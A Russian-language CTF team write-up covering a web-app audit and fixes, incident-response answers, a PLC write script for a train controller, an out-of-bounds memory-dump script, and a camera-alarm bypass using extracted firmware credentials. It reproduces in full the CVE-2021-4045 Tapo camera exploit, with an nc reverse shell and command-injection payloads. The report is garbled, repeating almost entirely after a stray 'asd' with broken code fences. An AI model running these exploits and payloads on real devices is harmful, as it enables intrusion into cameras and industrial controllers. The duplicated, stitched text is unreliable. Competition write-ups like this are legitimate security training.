## Отчет команды "Солнцево" о решенных задачах с развернутым ответом

### 1. Касса WAF
Был обнаружен WAF - ModSecurity.
Мы включили его, проставив опцию `SecStatusEngine On` в `/etc/nginx/modsecurity.d/modsecurity.conf` и добавили правило:
```
SecRule REQUEST_URI|ARGS|REQUEST_BODY “@rx (?i)(system|bash|etc)”  
“phase:2,deny,id:7331,msg:’Forbidden bruhh’,log,auditlog,status:403”
```
### 2. Мониторинг WAF
### 3. Непрошенные гости! - 1
Зашли на гитлаб, посмотрели на код и результаты работы CI (в котором все прогоняется через SonarQube).
Нашли следующие узявимости:
1. **Открытая БД**
	База данных торчит в интернет, а стандартный пароль от нее слабоват. Релевантная строчка кода:
	````- 5432:5432````
2. **Пароли в БД хранятся в открытом виде**
	Пароли там не хэшируются (правда не везде, вопросы к работоспособности сервиса в целом ¯\\_(ツ)_/¯
	Сниппет кода, в котором пароли не хэшируются:
	```python
	if not user or form_data.password != user.password:
		security.increment_login_attempts(username)  # Увеличиваем количество попыток входа
		raise HTTPException(
			status_code=status.HTTP_401_UNAUTHORIZED,
			detail="Incorrect username or password",
			headers={"WWW-Authenticate": "Bearer"},
		 )
	```
	Cниппет кода, в котором они хэшируются:
	```python
	if sha256(cd['current_password'].encode()).hexdigest() != user.password:
		return render(request, 'mysite/edit_profile.html', {'form': form, "user": user, "message": "Текущий пароль указан неверно"})
		if cd["password"] != cd["second_password"]:
			return render(request, 'mysite/edit_profile.html', {'form': form, "user": user, "message": "Новые пароли не совпадают"})
	```
3. **SQL-инъекция**
	В `diary/app/mysite/views.py` запросы форматируются f-строками, что приводит к SQL-инъекции
	Сниппет кода:
	```python
	with connection.cursor() as cursor:
		query = f"""
			INSERT INTO myapp_mark 
			(mark, date, user_id, subject_id)
			VALUES ({mark_value}, '{date}', 
			(SELECT id FROM myapp_user WHERE login = '{student_login}'), 
			(SELECT id FROM myapp_subject WHERE name = '{sub_name}'))
		 """
		 cursor.execute(query)
	```
4. **Токены не блокируются**
	Проверка того, что токен заблокирован и блокировка токена происходят в разных ключах в redis, так что блокировка токенов не работает. Неправильный код:
	```python
	def is_token_blacklisted(token):
		return redis_client.exists(f"blacklist:{token}")
	def blacklist_token(token: str):
		redis_client.set(f"black:{token}", "blocked")
	```
5. **Ключи от джанго в коде**
	```python
	SECRET_KEY = "Abqh4LSVdohqrlhtalvifAmEsymAvY9p"`
	```
	Знание ключа позволяет подписывать сессии и делать множество других страшных вещей
6. **Пароль от БД в коде**
	```python
	SQLALCHEMY_DATABASE_URL = f'postgresql://postgres:postgres@db:5432/postgres'`
	```
	Пароль, кстати, не всегда правильный, опять вопросы к работоспособности сервиса в целом ¯\\_(ツ)_/¯
7. **CSRF**
	В коде основного приложения вообще все ручки помечены как `@csrf_exempt`, что значит, что они никак не защищены от CSRF. Пример кода:
	```python
	@csrf_exempt
	def user_login(request):
		...
	```
8. **Debug**
	В конфигурации django параметр Debug - `True`, что **плохо** влияет на общую безопасность
9. **Пароль от почты в коде**
	```python
	mail_password = "adm.school.back"`
	``` 
	Это позволяет получить доступ в почте
10. **Отсутствие аутентификации на сервисе для уведомлений**
	Так как он торчит в интернет, любой человек может отправлять на почту уведомления от имени организации
### 4. Непрошенные гости! - 2
1. Закрыли открытый в интернет порт
	Код:
	```yaml
	 ports:  []
	 #  - 5432:5432
	```
2. Сделали так, чтобы все пароли хэшировались
	Пример измененного кода:
	```python
	def user_login(request):
		if request.method == 'POST':
			username = request.POST.get('username')
			password = request.POST.get('password')
			password_hash = sha256(password.encode()).hexdigest()
			with connection.cursor() as cursor:
				query = f"SELECT * FROM myapp_user WHERE login = %s AND password = %s"
				cursor.execute(query, (username, hashed_password))
				user = cursor.fetchone()
			if user:
				# Небезопасная авторизация
				user = django_user.objects.get(username=username)
				login(request, user)
				return redirect("/")
			else:
				return render(request, 'mysite/login.html', {"message": "Ошибка входа"})
				return render(request, 'mysite/login.html')
	```
3. Использовали параметризованные запросы вместо f-строк
	Пример кода: как в прошлом пункте, там тоже такой запрос есть :)
4. Сделали так, чтобы использовались одинаковые ключи
	Код с исправлением:
	```python
	def is_token_blacklisted(token):
		return redis_client.exists(f"blacklist:{token}")
	def blacklist_token(token: str):
		redis_client.set(f"blacklist:{token}", "blocked")
	```
5. Теперь ключ берется из секретов docker compose
	```python
	# SECURITY WARNING: keep the secret key used in production secret!
	SECRET_KEY = os.popen("cat /run/secrets/secret_key").read()
	```
6. Теперь пароль берется из `.env`
	```python
	DATABASES = {
		 'default': {
			 'ENGINE': 'django.db.backends.postgresql',
			 'NAME': "postgres",
			 'USER': "postgres",
			 'PASSWORD': os.getenv("DB_PASS"),
			 'HOST': 'db',
			 'PORT': '5432'
		 }
	}
	```
7. Убрали все `@csrf_exempt`
8. Убрали Debug-режим
	Обновленный код:
	```python
	# SECURITY WARNING: don't run with debug turned on in production!
	DEBUG = False
	```
9. Теперь пароль берется из `.env`:
	```yaml
	 environment:
		 PASSWORD:  ${MAIL_PASS}
	```
10. Закрыли доступ в этот сервис из интернета
	Актуальный кусочек кода:
	```yaml
	 ports:  []
	 #  - 8002:8000
	```
###  5. Поезд
Контроллер вообще не имеет никакой аутентификации, так что можно просто записать нашу строчку в память (цикл чтобы не ждать пока поезд остановится):
```python
from snap7.client import Client

while True:
    try:
        client = Client()
        client.connect("10.10.14.2", 0, 1)

        for i in range(200):
            offset = i * 50
            data = b"Solncevo" + b"\x00" * 42
            client.db_write(1, offset, data)
            print(i)

        client.disconnect()

    except:
        pass
```
### 6. Враг врага 1 - 1
Через почту от `admin [at] mai1server.pma.ru`
(1 - фишинг)
### 7. Враг врага 1 - 2
Был скачан архив `np++.zip`, в котором был файл `np++_release.exe` с иконкой `7Zip`.  Этот файл и является вредоносным
### 8. Враг врага 1 - 3
### 9. Враг врага 1 - 4
### 10. Враг врага 1 - 5
### 11. Враг врага 1 - 6
### 12. Враг врага 1 - 7
Скрипт, который запускается в результате активности приложения соединяется с хостом `103.137.250.153:8080`
### 13. Враг врага 1 - 8
Файл `Passwords.xlsx` с паролями.
### 14. Враг врага 2 - 1
На системе хостилось приложение на `Flask` в режиме отладки, с пин-кодом от консоли разработчика `123-456-789`. Злоумышленник прокинул через консоль реверс-шелл и подключился к системе.
### 15. Враг врага 2 - 2
- `81.177.221.242` - загрузка шифровальщика app 
- `10.10.10.12` - проникновение на систему
### 16. Враг врага 2 - 3
- сжатие с помощью [UPX](https://github.com/upx/upx)
- использование `CUSTOM_write` ([пример](https://github.com/tobyxdd/linux-anti-debugging/)) для защиты от дебага через ptrace
### 17. Враг врага 2 - 4
Нашли в Wireshark: `2025-01-22 22:35:52,600366701`
### 18. Враг врага 2 - 5
### 19. Враг врага 2 - 6
### 20. Кроличий горшок 2.0
Погуглив информацию про горшок и поизучав его API, мы нашли уязвимость: команда 1 позволяла получать данные из массива, при этом не проверяя границы - т.е., мы можем читать память горшка. Вот таким скриптом мы сдампили память:
```python
import struct  
import requests  

start_param = 0  
end_param = 10000

with open("meow.bin", "wb") as f:  
  for i in range(start_param, end_param):  
    print(f"[*] Requesting {i}")  
    r = requests.post("http://ADDRESS/control", json={"cmd": 1, "param": i})  
    value = r.json()["value"]  
    if type(value) == int:  
        f.write(struct.pack("<i", value))  
    elif type(value) == float:  
        f.write(struct.pack("<f", value))  
    elif value is None:  
        f.write(struct.pack("<i", 0))  
    else:  
        print("Unknown type!", value)  
    f.flush()
```
Внутри дампа памяти и нашелся флаг.
### 21. WIFI-Роутер
#### Флаг 1.
Если еще немного повыяснять про горшок, можно обнаружить, что в нем хранится пароль от сети, которую он сам же и раздает - проверив строки из дампа, мы смогли зайти на роутер и получить флаг
#### Флаг 2.
Пока не решили :(
### 22. Камера 1.0
Использовали следующий эксплойт:
```python
import requests, urllib3, sys, threading, os, hashlib, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 41101
REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
NC_COMMAND = 'nc -lp %d' % PORT

RTSP_USER = 'pwned1337'
RTSP_PASSWORD = 'pwned1337'
RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='

print(r"""
  CVE-2021-4045 PoC  _   @hacefresko
 _ ____      ___ __ | |_ __ _ _ __   ___
| '_ \ \ /\ / / '_ \| __/ _' | '_ \ / _ \
| |_) \ V  V /| | | | || (_| | |_) | (_) |
| .__/ \_/\_/ |_| |_|\__\__,_| .__/ \___/
|_|                          |_|
""")

if (len(sys.argv) < 4) or (sys.argv[1] != 'shell' and sys.argv[1] != 'rtsp'):
    print("[x] Usage: python3 pwnTapo.py [shell|rtsp] [victim_ip] [attacker_ip]")
    print()
    exit()

victim = sys.argv[2]
attacker = sys.argv[3]
url = "https://" + victim + ":443/"

if sys.argv[1] == 'shell':
    print("[+] Listening on port %d..." % PORT)
    t = threading.Thread(target=os.system, args=(NC_COMMAND,))
    t.start()
    time.sleep(2)
    print("[+] Sending reverse shell to %s...\n" % victim)
    json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
    requests.post(url, json=json, verify=False)

elif sys.argv[1] == 'rtsp':
    print("[+] Setting up RTSP video stream...")
    md5_rtsp_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
    json = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_rtsp_password, RTSP_CIPHERTEXT)}}
    resp = requests.post(url, json=json, verify=False)
    print("[+] PAYLOAD SENT, %s", resp.status_code)

    print("[+] RTSP video stream available at rtsp://%s/stream2" % victim)
    print("[+] RTSP username: %s" % RTSP_USER)
    print("[+] RTSP password: %s" % RTSP_PASSWORD)                                                                                                                                                                                                                                            ```
  ```
  asd## Отчет команды "Солнцево" о решенных задачах с развернутым ответом

### 1. Касса WAF
Был обнаружен WAF - ModSecurity.
Мы включили его, проставив опцию `SecStatusEngine On` в `/etc/nginx/modsecurity.d/modsecurity.conf` и добавили правило:
```
SecRule REQUEST_URI|ARGS|REQUEST_BODY “@rx (?i)(system|bash|etc)”  
“phase:2,deny,id:7331,msg:’Forbidden bruhh’,log,auditlog,status:403”
```
### 2. Мониторинг WAF
### 3. Непрошенные гости! - 1
Зашли на гитлаб, посмотрели на код и результаты работы CI (в котором все прогоняется через SonarQube).
Нашли следующие узявимости:
1. **Открытая БД**
	База данных торчит в интернет, а стандартный пароль от нее слабоват. Релевантная строчка кода:
	````- 5432:5432````
2. **Пароли в БД хранятся в открытом виде**
	Пароли там не хэшируются (правда не везде, вопросы к работоспособности сервиса в целом ¯\\_(ツ)_/¯
	Сниппет кода, в котором пароли не хэшируются:
	```python
	if not user or form_data.password != user.password:
		security.increment_login_attempts(username)  # Увеличиваем количество попыток входа
		raise HTTPException(
			status_code=status.HTTP_401_UNAUTHORIZED,
			detail="Incorrect username or password",
			headers={"WWW-Authenticate": "Bearer"},
		 )
	```
	Cниппет кода, в котором они хэшируются:
	```python
	if sha256(cd['current_password'].encode()).hexdigest() != user.password:
		return render(request, 'mysite/edit_profile.html', {'form': form, "user": user, "message": "Текущий пароль указан неверно"})
		if cd["password"] != cd["second_password"]:
			return render(request, 'mysite/edit_profile.html', {'form': form, "user": user, "message": "Новые пароли не совпадают"})
	```
3. **SQL-инъекция**
	В `diary/app/mysite/views.py` запросы форматируются f-строками, что приводит к SQL-инъекции
	Сниппет кода:
	```python
	with connection.cursor() as cursor:
		query = f"""
			INSERT INTO myapp_mark 
			(mark, date, user_id, subject_id)
			VALUES ({mark_value}, '{date}', 
			(SELECT id FROM myapp_user WHERE login = '{student_login}'), 
			(SELECT id FROM myapp_subject WHERE name = '{sub_name}'))
		 """
		 cursor.execute(query)
	```
4. **Токены не блокируются**
	Проверка того, что токен заблокирован и блокировка токена происходят в разных ключах в redis, так что блокировка токенов не работает. Неправильный код:
	```python
	def is_token_blacklisted(token):
		return redis_client.exists(f"blacklist:{token}")
	def blacklist_token(token: str):
		redis_client.set(f"black:{token}", "blocked")
	```
5. **Ключи от джанго в коде**
	```python
	SECRET_KEY = "Abqh4LSVdohqrlhtalvifAmEsymAvY9p"`
	```
	Знание ключа позволяет подписывать сессии и делать множество других страшных вещей
6. **Пароль от БД в коде**
	```python
	SQLALCHEMY_DATABASE_URL = f'postgresql://postgres:postgres@db:5432/postgres'`
	```
	Пароль, кстати, не всегда правильный, опять вопросы к работоспособности сервиса в целом ¯\\_(ツ)_/¯
7. **CSRF**
	В коде основного приложения вообще все ручки помечены как `@csrf_exempt`, что значит, что они никак не защищены от CSRF. Пример кода:
	```python
	@csrf_exempt
	def user_login(request):
		...
	```
8. **Debug**
	В конфигурации django параметр Debug - `True`, что **плохо** влияет на общую безопасность
9. **Пароль от почты в коде**
	```python
	mail_password = "adm.school.back"`
	``` 
	Это позволяет получить доступ в почте
10. **Отсутствие аутентификации на сервисе для уведомлений**
	Так как он торчит в интернет, любой человек может отправлять на почту уведомления от имени организации
### 4. Непрошенные гости! - 2
1. Закрыли открытый в интернет порт
	Код:
	```yaml
	 ports:  []
	 #  - 5432:5432
	```
2. Сделали так, чтобы все пароли хэшировались
	Пример измененного кода:
	```python
	def user_login(request):
		if request.method == 'POST':
			username = request.POST.get('username')
			password = request.POST.get('password')
			password_hash = sha256(password.encode()).hexdigest()
			with connection.cursor() as cursor:
				query = f"SELECT * FROM myapp_user WHERE login = %s AND password = %s"
				cursor.execute(query, (username, hashed_password))
				user = cursor.fetchone()
			if user:
				# Небезопасная авторизация
				user = django_user.objects.get(username=username)
				login(request, user)
				return redirect("/")
			else:
				return render(request, 'mysite/login.html', {"message": "Ошибка входа"})
				return render(request, 'mysite/login.html')
	```
3. Использовали параметризованные запросы вместо f-строк
	Пример кода: как в прошлом пункте, там тоже такой запрос есть :)
4. Сделали так, чтобы использовались одинаковые ключи
	Код с исправлением:
	```python
	def is_token_blacklisted(token):
		return redis_client.exists(f"blacklist:{token}")
	def blacklist_token(token: str):
		redis_client.set(f"blacklist:{token}", "blocked")
	```
5. Теперь ключ берется из секретов docker compose
	```python
	# SECURITY WARNING: keep the secret key used in production secret!
	SECRET_KEY = os.popen("cat /run/secrets/secret_key").read()
	```
6. Теперь пароль берется из `.env`
	```python
	DATABASES = {
		 'default': {
			 'ENGINE': 'django.db.backends.postgresql',
			 'NAME': "postgres",
			 'USER': "postgres",
			 'PASSWORD': os.getenv("DB_PASS"),
			 'HOST': 'db',
			 'PORT': '5432'
		 }
	}
	```
7. Убрали все `@csrf_exempt`
8. Убрали Debug-режим
	Обновленный код:
	```python
	# SECURITY WARNING: don't run with debug turned on in production!
	DEBUG = False
	```
9. Теперь пароль берется из `.env`:
	```yaml
	 environment:
		 PASSWORD:  ${MAIL_PASS}
	```
10. Закрыли доступ в этот сервис из интернета
	Актуальный кусочек кода:
	```yaml
	 ports:  []
	 #  - 8002:8000
	```
###  5. Поезд
Контроллер вообще не имеет никакой аутентификации, так что можно просто записать нашу строчку в память (цикл чтобы не ждать пока поезд остановится):
```python
from snap7.client import Client

while True:
    try:
        client = Client()
        client.connect("10.10.14.2", 0, 1)

        for i in range(200):
            offset = i * 50
            data = b"Solncevo" + b"\x00" * 42
            client.db_write(1, offset, data)
            print(i)

        client.disconnect()

    except:
        pass
```
### 6. Враг врага 1 - 1
Через почту от `admin [at] mai1server.pma.ru`
(1 - фишинг)
### 7. Враг врага 1 - 2
Был скачан архив `np++.zip`, в котором был файл `np++_release.exe` с иконкой `7Zip`.  Этот файл и является вредоносным
### 8. Враг врага 1 - 3
### 9. Враг врага 1 - 4
### 10. Враг врага 1 - 5
### 11. Враг врага 1 - 6
### 12. Враг врага 1 - 7
Скрипт, который запускается в результате активности приложения соединяется с хостом `103.137.250.153:8080`
### 13. Враг врага 1 - 8
Файл `Passwords.xlsx` с паролями.
### 14. Враг врага 2 - 1
На системе хостилось приложение на `Flask` в режиме отладки, с пин-кодом от консоли разработчика `123-456-789`. Злоумышленник прокинул через консоль реверс-шелл и подключился к системе.
### 15. Враг врага 2 - 2
- `81.177.221.242` - загрузка шифровальщика app 
- `10.10.10.12` - проникновение на систему
### 16. Враг врага 2 - 3
- сжатие с помощью [UPX](https://github.com/upx/upx)
- использование `CUSTOM_write` ([пример](https://github.com/tobyxdd/linux-anti-debugging/)) для защиты от дебага через ptrace
### 17. Враг врага 2 - 4
Нашли в Wireshark: `2025-01-22 22:35:52,600366701`
### 18. Враг врага 2 - 5
### 19. Враг врага 2 - 6
### 20. Кроличий горшок 2.0
Погуглив информацию про горшок и поизучав его API, мы нашли уязвимость: команда 1 позволяла получать данные из массива, при этом не проверяя границы - т.е., мы можем читать память горшка. Вот таким скриптом мы сдампили память:
```python
import struct  
import requests  

start_param = 0  
end_param = 10000

with open("meow.bin", "wb") as f:  
  for i in range(start_param, end_param):  
    print(f"[*] Requesting {i}")  
    r = requests.post("http://ADDRESS/control", json={"cmd": 1, "param": i})  
    value = r.json()["value"]  
    if type(value) == int:  
        f.write(struct.pack("<i", value))  
    elif type(value) == float:  
        f.write(struct.pack("<f", value))  
    elif value is None:  
        f.write(struct.pack("<i", 0))  
    else:  
        print("Unknown type!", value)  
    f.flush()
```
Внутри дампа памяти и нашелся флаг.
### 21. WIFI-Роутер
#### Флаг 1.
Если еще немного повыяснять про горшок, можно обнаружить, что в нем хранится пароль от сети, которую он сам же и раздает - проверив строки из дампа, мы смогли зайти на роутер и получить флаг
#### Флаг 2.
Пока не решили :(
### 22. Камера 1.0
Использовали следующий эксплойт:
```python
import requests, urllib3, sys, threading, os, hashlib, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 41101
REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
NC_COMMAND = 'nc -lp %d' % PORT

RTSP_USER = 'pwned1337'
RTSP_PASSWORD = 'pwned1337'
RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='

print(r"""
  CVE-2021-4045 PoC  _   @hacefresko
 _ ____      ___ __ | |_ __ _ _ __   ___
| '_ \ \ /\ / / '_ \| __/ _' | '_ \ / _ \
| |_) \ V  V /| | | | || (_| | |_) | (_) |
| .__/ \_/\_/ |_| |_|\__\__,_| .__/ \___/
|_|                          |_|
""")

if (len(sys.argv) < 4) or (sys.argv[1] != 'shell' and sys.argv[1] != 'rtsp'):
    print("[x] Usage: python3 pwnTapo.py [shell|rtsp] [victim_ip] [attacker_ip]")
    print()
    exit()

victim = sys.argv[2]
attacker = sys.argv[3]
url = "https://" + victim + ":443/"

if sys.argv[1] == 'shell':
    print("[+] Listening on port %d..." % PORT)
    t = threading.Thread(target=os.system, args=(NC_COMMAND,))
    t.start()
    time.sleep(2)
    print("[+] Sending reverse shell to %s...\n" % victim)
    json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
    requests.post(url, json=json, verify=False)

elif sys.argv[1] == 'rtsp':
    print("[+] Setting up RTSP video stream...")
    md5_rtsp_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
    json = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_rtsp_password, RTSP_CIPHERTEXT)}}
    resp = requests.post(url, json=json, verify=False)
    print("[+] PAYLOAD SENT, %s", resp.status_code)

    print("[+] RTSP video stream available at rtsp://%s/stream2" % victim)
    print("[+] RTSP username: %s" % RTSP_USER)
    print("[+] RTSP password: %s" % RTSP_PASSWORD)                                                                                                                                                                                                                                            ```
  ```
  Мы смогли поменять пароль от камеры и получить доступ до видеопотока по rtsp, на котором и увидели флаг.
  
### Камера 2.0
[https://drmnsamoliu.github.io/userconfig.html](https://drmnsamoliu.github.io/userconfig.html)

Последуем по шагам исследоваеля, вытащим squashfs, удостоверимся, что на оффсете находится та же строка

```shell
dd if=36b26e75-b37c-4a97-87c9-09f8d5dbefc4_firmware.bin skip=393408 bs=1 count=12 => C200 1.012+0 
records in
```

Используем полученный им ключ, расшифруем, получим конфиг, в рамках которых видим креды: `taygarabbit:tayezhniykrolik1336@!`

Далее, заметим что на 443 порту у данных камер поддерживается API для контроля действиями. Найдем на github клиент, позволяющий реализовывать выключение сигнализации.

[https://github.com/KusoKaihatsuSha/appgotapo](https://github.com/KusoKaihatsuSha/appgotapo)

ставим зависимости, билдим:
```
 go get github.com/KusoKaihatsuSha/appgotapo 
 go build .
 ```

И выключаем сигализацию:
```
./appgotapo -do alarm_off -host 10.10.11.213 -u “taygarabbit” -p “tayezhniykrolik1336@!“
```

Далее заходим в комнату и получаем флаг.
```nto{f4153_414rm_0n_t4p0}```



